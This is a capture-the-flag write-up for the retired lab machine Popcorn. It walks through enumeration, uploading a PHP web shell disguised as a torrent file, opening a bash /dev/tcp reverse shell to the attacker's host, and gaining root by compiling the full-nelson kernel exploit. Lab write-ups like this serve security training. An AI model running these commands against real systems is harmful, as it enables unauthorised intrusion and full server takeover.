# Popcorn 10.10.10.6 Write Up

## Contents
- [Tools](#tools)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Priviledge Escalation](#priviledge-escalation)

Retired Medium Machine by ch4p

## Tools
1. Nmap
2. gobuster / dirb / dirbuster
3. Burp Suite Community Edition / OWASP ZAP
4. NetCat
5. linux-exploit-suggester.sh /SearchExploit (OFFSEC exploitDB) / Google

## Enumeration

1. Nmap with `nmap -A 10.10.10.6` gives two open ports, port 22 for ssh and 80 for http.
2. On port 80 running gobuster with `gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40` gives some links as output. Output shows some links, `/test`, `/index`, `/torrent` etc.
3. `/test` page shows `phpinfo` allowed file upload.
4. On `/torrent` page we can see sign up and log in option. 


## Exploitation

1. After loggin in we can use the upload option. During uploading torrent file, we can modify filename and filecontent to php shell code with burp suite or OWASP ZAP.
<img src="./img/4b.png?raw=true" width="80%" alt="Burp">
2. We can goto `/torrent/upload` directory to get our file and simple `curl http://10.10.10.6/torrent/upload/3like1share3folllow3subscribe7.php?test=whoami` will execute command on the server.
3. Running netcat client on host with `nc -lvnp 1337` and command `curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php --data-urlencode "test=bash -c 'bash -i >& /dev/tcp/10.10.14.100/1337 0>&1'"` will give us shell as user `www-data`.
4. Now we can simply get `user.txt` as `www-data` for user `george` with command `cat /home/george/user.txt`.
  ```bash
  www-data@popcorn: ls /home
  george
  www-data@popcorn: cat /home/george/user.txt
  userflaglikesharesubscribefollow
  ```

## Priviledge Escalation

1. After importing linux-exploit-suggester.sh we can get a lot of priviledge escalation exploits.
<img src="./img/4c.png?raw=true" width="80%" alt="linux-exploit-suggester">
2. One of them is full-nelson (http://vulnfactory.org/exploits/full-nelson.c). After importing it to the machine, we can compile it with `gcc full-nelson.c -o full-nelson`.
3. Then We get root and root flag.
  ```bash
  www-data@popcorn:tmp$ gcc full-nelson.c - exploit
  gcc full-nelson.c - exploit
  www-data@popcorn:tmp$ chmod +x exploit
  chmod +x exploit
  www-data@popcorn:tmp$ ./exploit
  www-data@popcorn:tmp$ ./exploit
  www-data@popcorn:tmp$ ./exploit
  ./exploit
  id
  uid=0(root) gid=0(root)
  cat /root/root.txt
  rootflaglikesharesubscribefollow
  ```
4. Also dirtycow, motd and many other exploits are possible. As the server kernel version is too old.

Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
